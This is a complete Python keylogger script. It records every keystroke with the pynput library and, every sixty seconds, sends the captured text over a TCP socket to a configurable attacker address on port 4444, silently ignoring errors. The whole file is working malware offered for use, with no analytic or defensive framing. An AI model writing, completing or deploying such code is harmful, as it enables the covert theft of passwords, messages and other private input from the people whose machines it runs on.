#!/usr/bin/env python3
# Python Keylogger
from pynput import keyboard
import socket
import threading
import time

ATTACKER_IP = "CHANGE_ME"
ATTACKER_PORT = 4444
LOG_INTERVAL = 60

log = ""

def on_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        else:
            log += f" [{key}] "

def send_logs():
    global log
    while True:
        time.sleep(LOG_INTERVAL)
        if log:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ATTACKER_IP, ATTACKER_PORT))
                s.send(log.encode())
                s.close()
                log = ""
            except:
                pass

send_thread = threading.Thread(target=send_logs, daemon=True)
send_thread.start()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
